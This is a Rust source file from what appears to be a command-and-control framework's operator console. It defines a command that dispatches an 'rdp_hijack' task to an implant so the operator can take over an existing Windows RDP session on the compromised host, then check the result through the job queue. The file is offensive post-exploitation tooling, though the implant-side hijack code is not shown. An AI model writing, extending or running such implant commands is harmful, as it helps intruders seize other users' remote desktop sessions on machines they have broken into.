//! RDP session hijacking commands

use anyhow::Result;
use common::ImplantId;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Hijack an existing RDP session on the implant host
///
/// # Arguments
/// * `session_id` - The Windows session ID to hijack (use 'ps' to find active RDP sessions)
pub async fn hijack(cli: &CliState, session_id: u32) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Hijacking RDP session {}...", session_id));

    // Encode session_id as 4 bytes little-endian
    let task_data = session_id.to_le_bytes().to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "rdp_hijack", task_data).await?;
    print_success(&format!("RDP hijack task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Use 'jobs output' to check result");

    Ok(())
}
